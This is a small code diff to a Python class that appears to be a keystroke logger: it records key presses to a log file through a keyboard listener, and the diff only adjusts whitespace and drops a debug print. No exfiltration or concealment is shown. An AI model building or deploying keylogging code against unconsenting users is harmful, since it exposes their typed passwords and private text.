@@ -16,11 +16,11 @@ class Logger:
     def __init__(self) -> None:
         # Ensure the logs directory exists
         os.makedirs(LOGS_DIR, exist_ok=True)
-
+        
         self.keystrokes_file = open(
             os.path.join(LOGS_DIR, KEYSTROKES_FILE), "a", encoding="utf-8"
         )
-
+        
         logging.basicConfig(
             filename=os.path.join(LOGS_DIR, LOGS_FILE),
             level=logging.INFO,
@@ -81,7 +81,6 @@ class Logger:
             self.buffer += key_str
 
     def on_release(self, key) -> bool | None:
-        print(f"{key} released")
         if DEBUG and key == keyboard.Key.esc:
             logging.warning("===> Listener has been stopped by user <===")
             return False  # Stop listener
